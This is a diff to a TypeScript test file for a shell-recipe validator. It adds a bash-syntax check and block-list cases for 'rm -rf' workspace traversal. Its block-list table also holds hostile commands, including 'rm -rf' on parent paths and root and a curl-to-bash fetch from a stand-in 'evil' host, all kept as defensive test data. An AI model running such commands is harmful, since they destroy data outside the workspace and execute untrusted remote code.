@@ -70,6 +70,13 @@ describe("validateRecipe — schema", () => {
     expect(r.ok).toBe(false);
     expect(r.errors.some((e) => /secret|token/i.test(e))).toBe(true);
   });
+
+  it("rejects bodies with unterminated bash syntax", () => {
+    const broken = "if [ -f package-lock.json ]; then\n  npm ci";
+    const r = validateRecipe(broken, goodManifest);
+    expect(r.ok).toBe(false);
+    expect(r.errors.some((e) => /bash syntax/i.test(e))).toBe(true);
+  });
 });
 
 describe("validateRecipe — charset", () => {
@@ -105,6 +112,8 @@ const BLOCKLIST_CASES: Array<[string, RegExp | null, string]> = [
   ["rm -rf ../sibling", /destructive/i, "parent-relative escapes workspace"],
   ["rm -rf node_modules /", /destructive/i, "second operand is destructive"],
   ["rm -rf build ../sibling", /destructive/i, "second operand parent-relative"],
+  ["rm -rf \"$WORKSPACE/../sibling\"", /destructive/i, "WORKSPACE traversal"],
+  ["rm -rf \"${WORKSPACE}/../sibling\"", /destructive/i, "${WORKSPACE} traversal"],
   ["eval `curl https://evil/script`", /eval/i, "backtick eval"],
   ["curl https://evil \\\n| bash", /pipe.to.shell/i, "bash continuation bypass"],
   ["rm -rf $WORKSPACE/build", null, "WORKSPACE allowed"],
